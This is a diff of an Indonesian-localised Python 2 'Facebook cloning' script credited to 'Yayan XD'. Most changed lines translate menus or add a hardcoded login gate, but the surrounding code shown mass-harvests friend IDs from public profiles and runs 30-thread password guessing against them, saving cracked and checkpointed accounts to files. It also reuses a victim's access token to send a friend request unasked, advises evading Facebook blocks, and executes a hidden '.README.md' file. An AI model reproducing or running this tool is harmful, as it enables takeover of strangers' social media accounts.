@@ -81,43 +81,66 @@ Y='\033[1;93m'
 #Dev:YAYAN XD
 #### LOGO ####
 logo = """
-\033[1;95m                       ,ood8888booo,
-\033[1;91m                    ,oda8a888a888888bo,
-\033[1;94m                 ,od88888888aa888aa88a8bo,
-\033[1;95m               ,da8888aaaa88a888aaaa8a8a88b,
-\033[1;94m              ,oa888aaaa8aa8888aaa8aa8a8a88o,
-\033[1;91m             ,88888aaaaaa8aa8888a8aa8aa888a88,
-\033[1;95m             8888a88aaaaaa8a88aa8888888a888888
-\033[1;94m             888aaaa88aa8aaaa8888; ;8888a88888
-\033[1;91m             Y888a888a888a8888;'   ;888888a88Y
-\033[1;95m              Y8a8aa8a888a88'      ,8aaa8888Y
-\033[1;94m               Y8a8aa8aa8888;     ;8a8aaa88Y
-\033[1;91m                `Y88aa8888;'      ;8aaa88Y'
-\033[1;95m        ,,;;;;;;;;'''''''         ;8888Y'
-\033[1;94m     ,,;                         ,888P
-\033[1;95m   ,;  ,;,                      ;""
-\033[1;94m  ;       ;          ,    ,    ,;
-\033[1;95m ;  ;,    ;     ,;;;;;   ;,,,  ;
-\033[1;91m;  ; ;  ,' ;  ,;      ;  ;   ;  ;
-\033[1;94m; ;  ; ;  ;  '        ; ,'    ;  ;
-\033[1;91m`;'  ; ;  '; ;,       ; ;      ; ',
-\033[1;95m     ;  ;,  ;,;       ;  ;,     ;;;
-\033[1;94m      ;,,;             ;,,;     
-\033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;91mAUTHOR : \033[0;92mYayan XD                     \033[0;91m      ║
-\033[0;91m║\033[0;91mGITHUB :\033[0;92m https://github.com/Yayan-XD   \033[0;91m     ║
-\033[0;91m║\033[0;91mFB Me :\033[0;92m Moch Yayan Juan Alvredo XD. \033[0;91m   ║
-\033[0;95m╰════════════════════════════════════════════╯
-\033[1;94m⊱══════════════════⊱═⊰BACOT BROTHERHOOD⊱═⊰══════════════════⊰
-\033[1;91mPERINGATAN :\033[1;93mGUNAKAN AKUN BARU UNTUK LOGIN, JANGAN GUNAKAN LOGIN AKUN TUA JIKA AKUN ANDA AKAN DI BLOK
-\033[1;91mWIFI ATAU DATA MOBILE :\033[1;93mJANGAN GUNAKAN WIFI, HANYA MENGGUNAKAN DATA MOBILE UNTUK KLONING 
-\033[1;91mID TIDAK DITEMUKAN MASALAH :\033[1;93mSALIN UNTUK PROFIL USERNAME FOTO DAN KEMUDIAN PASTE DI TERMUX
+\033[1;91m  ▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒
+\033[1;91m  ▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒
+\033[1;91m  ▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌
+\033[1;91m  ▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;91m  ▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  █████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  █████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;97m  ████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;93m╔══╗╔══╗─╔════╦═══╦═══╦═╗╔═╗
+\033[1;93m║╔╗║║╔╗║─║╔╗╔╗║╔══╣╔═╗║║╚╝║║ UPDATE V.01🇮🇩
+\033[1;93m║╚╝╚╣╚╝╚╗╚╝║║╚╣╚══╣║─║║╔╗╔╗║
+\033[1;93m║╔═╗║╔═╗║──║║─║╔══╣╚═╝║║║║║║
+\033[1;93m║╚═╝║╚═╝║──║║─║╚══╣╔═╗║║║║║║
+\033[1;93m╚═══╩═══╝──╚╝─╚═══╩╝─╚╩╝╚╝╚╝
+\033[1;91m╭════════════════════════════════════════════╮
+\033[0;91m║\033[0;91mAUTHOR :\033[0;91mYayan XD                     \033[0;91m       ║
+\033[0;91m║\033[0;91mWA ME  :\033[0;91m085603036683                 \033[0;91m       ║
+\033[0;97m║\033[0;97mFB ME  :\033[0;97mMoch Yayan Juan Alvredo XD.  \033[0;97m       ║
+\033[0;97m║\033[0;97mGITHUB :\033[0;97mhttps://github.com/Yayan-XD  \033[0;97m       ║
+\033[0;97m╰════════════════════════════════════════════╯
+\033[1;96m⊱═══════════⊱═⊰BACOT BROTHERHOOD⊱═══════════⊱═⊰
 """
+
+CorrectUsername = "YayanGanteng"
+CorrectPassword = "AkuJelek"
+
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;96m[☆] \x1b[1;97mKETIK YayanGanteng \x1b[1;96m>>>> ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m[☆] \x1b[1;97mKETIK AkuJelek \x1b[1;96m>>>> ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username
+            loop = 'false'
+        else:
+            print "Salah Tolol! Ketik AkuJelek"
+            os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
+    else:
+        print "Salah Tolol! Ketik YayanGanteng"
+        os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -176,24 +199,24 @@ def login():
 	os.system('clear')
 	print logo
 	jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
-	print "\033[1;91m>>>\033[1;91m[1]\033[1;94m Cloning All Countries \033[1;91m(\033[1;97mWithout Fb login\033[1;91m) "
+	print "\033[1;91m>>>\033[1;91m[1]\033[1;94m Cloning Semua Negara \033[1;91m(\033[1;97mTanpa Fb login\033[1;91m) "
 	time.sleep(0.05)
-	print "\033[1;91m>>>\033[1;91m[2]\033[1;93m Login with Facebook  "
+	print "\033[1;91m>>>\033[1;91m[2]\033[1;93m Login Pakai Facebook  "
         time.sleep(0.05)
-        print "\033[1;91m>>>\033[1;91m[3]\033[1;94m Login with access token "
+        print "\033[1;91m>>>\033[1;91m[3]\033[1;94m Login Pakai Akses token "
         time.sleep(0.05)
-        print "\033[1;91m>>>\033[1;91m[4]\033[1;93m Download Access token"
+        print "\033[1;91m>>>\033[1;91m[4]\033[1;93m Unduh Akses token"
 	time.sleep(0.05)
 	print "\033[1;91m>>>\033[1;91m[5]\033[1;94m Ikuti Fb Saya"
 	time.sleep(0.05) 
-	print "\033[1;91m>>>\033[1;91m[6]\033[1;93m See all yayan commmand" 
+	print "\033[1;91m>>>\033[1;91m[6]\033[1;93m Follow Ig Saya @yayanxd_" 
 	time.sleep(0.05)
-	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Logout        "
+	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Keluar        "
 	jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
 	pilih_login()
 
 def pilih_login():
-	peak = raw_input("\n\033[1;91mChoose an Option═╬══►\033[1;95m")
+	peak = raw_input("\n\033[1;91mPilih Nomer═╬══►\033[1;95m")
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_login()
@@ -232,8 +255,8 @@ def login1():
                 time.sleep(0.05)
 		print logo
 		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
-		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
-		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
+		jalan('\033[1;96m[✾]\x1b[1;91mJANGAN GUNAKAN AKUN OLD UNTUK LOGIN\x1b[1;96m[✾]' )
+		jalan('\033[1;96m[✾]\x1b[1;91mGUNAKAN AKUN BARU BUAT/LOGIN FIA TOKEN\x1b[1;96m[✾]' )
 		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
@@ -264,19 +287,19 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				jalan( '\n\x1b[1;95mLogin Successful...') 
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;97mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			print("\n\x1b[1;97mSepertinya Akun Anda Terkena Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
+			print("\n\x1b[1;93mPassword/Email Anda Salah")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -284,7 +307,7 @@ def login1():
 def tokenz():
 	os.system('clear')
 	print logo
-	toket = raw_input("\033[1;91m[+]\033[1;92mToken\033[1;91m :\033[1;95mEnter accees token link without Fb login>> ")
+	toket = raw_input("\033[1;91m[+]\033[1;92mToken\033[1;91m :\033[1;95mMasukkan tautan token accees tanpa login Fb>> ")
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -294,8 +317,8 @@ def tokenz():
 		zedd.close()
 		menu()
 	except KeyError:
-		print "\033[1;91m[!] Wrong"
-		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		print "\033[1;91m[!] Salah"
+		e = raw_input("\033[1;91m[?] \033[1;92mAnda Tau token? Kalo Tidak Tau Pm Saya!\033[1;97m[y/n]: ")
 		if e =="":
 			keluar()
 		elif e =="y":
@@ -323,7 +346,7 @@ def menu():
                 sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;97mSepertinya Akun Anda Terkena Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -337,8 +360,8 @@ def menu():
 	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
 	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
 	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
-	print "\033[1;32;98m[1] \033[1;96m>> start Cloning "																														
-	print "\033[1;32;98m[0] \033[1;96m>> Log out"
+	print "\033[1;32;98m[1] \033[1;96m>> Mulai Cloning "																														
+	print "\033[1;32;98m[0] \033[1;96m>> Keluar"
 	pilih()
 
 def pilih():
@@ -376,8 +399,8 @@ def super():
 	os.system('clear')
 	print logo
 	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
-	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Hack From Public ID") 
-	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
+	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Hack Daftar Teman Publik") 
+	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Keluar") 
 	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
 	pilih_super()
 
@@ -399,7 +422,7 @@ def pilih_super():
 			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
+		print"\033[1;35;37m[⊱⋕⊰] Jangan Dulu Keluar Peler Lagi Proses... "
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -411,8 +434,8 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
-	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
+	print "\033[1;36;96m[⊱⋕⊰] Total ID : \033[1;92m"+str(len(id))
+	jalan('\033[1;34;96m[⊱⋕⊰] Mohon Tunggu ')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
@@ -537,9 +560,9 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Telah Selesai \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
+	print("\033[1;96m[+] \033[1;92mCP File Sudah Tersimpan \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 	
@@ -558,7 +581,7 @@ def menu():
 	print '\033[1;94m[9]\033[1;96m  Spain        \033[1;91m⇋  \033[1;94m[28]\033[1;96m  Mongolia'
 	print '\033[1;94m[10]\033[1;93m Poland       \033[1;91m⇋  \033[1;94m[29]\033[1;93m  New Zealand'
 	print '\033[1;94m[11]\033[1;96m Pakistan     \033[1;91m⇋  \033[1;94m[30]\033[1;96m  Sudan'
-	print '\033[1;94m[12]\033[1;93m Indonisi     \033[1;91m⇋  \033[1;94m[+]\033[1;92m Pak Nbr Fb Clone\033[1;94m[+] '
+	print '\033[1;94m[12]\033[1;93m Indonisia    \033[1;91m⇋  \033[1;94m[+]\033[1;92m Pak Nbr Fb Clone\033[1;94m[+] '
 	print '\033[1;94m[13]\033[1;96m Iran         \033[1;91m⇋  \033[1;94m[A]\033[1;93m Telenor' 
 	print '\033[1;94m[14]\033[1;93m Grecee       \033[1;91m⇋  \033[1;94m[B]\033[1;96m  Zong'
 	print '\033[1;94m[15]\033[1;93m Afghanistan  \033[1;91m⇋  \033[1;94m[C]\033[1;93m  Jazz'
@@ -566,15 +589,15 @@ def menu():
 	print '\033[1;94m[17]\033[1;93m Turky        \033[1;91m⇋  \033[1;94m[D]\033[1;96m Airtel/Robi' 
 	print '\033[1;94m[18]\033[1;96m Iraq         \033[1;91m⇋  \033[1;94m[E]\033[1;93m Grameenphone' 
 	print '\033[1;94m[19]\033[1;93m France       \033[1;91m⇋  \033[1;94m[F]\033[1;96m Banglalink' 
-	print '[0]\033[1;97m  Logout            '
-	print '>>\033[1;92m Waiting for Next New Script \033[1;91m(\033[1;97mYayan-XD\033[1;91m) ' 
+	print '[0]\033[1;97m  Keluar            '
+	print '>>\033[1;92m Selamat Datang Di Script \033[1;91m(\033[1;97mYayan-XD\033[1;91m) ' 
 	print 42*"\033[1;91m="
 	action()
 	
 	
 
 def action():
-	bch = raw_input('\n\033[1;91mSelect Option \033[1;93m>>>\033[1;95m  ')
+	bch = raw_input('\n\033[1;91mPilih Nomer \033[1;93m>>>\033[1;95m  ')
 	if bch =='':
 		print '[!] Fill in correctly'
 		action()
@@ -1098,9 +1121,9 @@ def action():
 	xxx = str(len(id))
 	print ('[✓] Total Numbers: '+xxx)
 	time.sleep(0.1)
-	print ('\033[1;91m[✓]\033[1;94m Please wait, process is running ...')
+	print ('\033[1;91m[✓]\033[1;94m Mohon Tunggu Proses Sedang Berjalan ...')
 	time.sleep(0.1)
-	print ('[!] To Stop Process Press CTRL Then Press z')
+	print ('[!] Untuk Menghentikan Proses Tekan CTRL Lalu Tekan z')
 	time.sleep(0.5)
 	print 42*"\033[1;91m="
 	
@@ -1138,9 +1161,9 @@ def action():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;91m="
-	print '[✓]\033[1;93m Process Has Been Completed ....'
+	print '[✓]\033[1;93m Process Telah Selesai ...'
 	print '[✓]\033[1;92m Total OK/\033[1;96mCP : '+str(len(oks))+'/'+str(len(cpb))
-	print('[✓]\033[1;91m CP File Has Been Saved : save/checkpoint.txt')
+	print('[✓]\033[1;91m CP File Telah Disimpan : save/checkpoint.txt')
 	raw_input('\n[Press Enter To Go Back]')
 	os.system('python2 .README.md')
 
